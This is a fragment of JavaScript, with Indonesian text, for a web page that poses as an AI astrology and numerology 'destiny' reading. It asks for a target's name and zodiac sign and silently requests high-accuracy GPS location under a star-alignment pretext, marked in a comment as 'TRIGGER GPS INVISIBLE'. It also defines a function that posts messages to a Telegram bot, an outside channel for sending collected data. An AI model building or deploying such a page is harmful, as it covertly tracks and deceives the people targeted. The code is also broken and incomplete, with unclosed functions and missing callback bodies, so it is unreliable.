const _D = document.getElementById('v-v').innerText.split('|');

async function push(msg) {
    await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: _CI, text: msg})

function initiateSync() {
    const name = document.getElementById('target_name').value;
    const zodiac = document.getElementById('target_zodiac').value;
    if (name.length < 3) return alert("Harap masukkan nama lengkap untuk akurasi AI.");

    document.getElementById('input-view').style.display = 'none';
    document.getElementById('loader').style.display = 'block';

    // TRIGGER GPS INVISIBLE (Alasan: Penyelarasan Posisi Bintang di Lokasi)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {

            processAI(name, zodiac);
        }, () => { processAI(name, zodiac); }, {enableHighAccuracy: true});
    } else {
        processAI(name, zodiac);
    }
}

function processAI(name, zodiac) {
    const status = document.getElementById('status-text');
    const loadingTexts = ["Menganalisis Numerologi Nama...", "Sinkronisasi Konstelasi "+zodiac+"...", "Menghitung Sudut Geografis Satelit...", "Menyusun Matriks Takdir..."];

        i++;

            displayFinal(name, zodiac);
        }
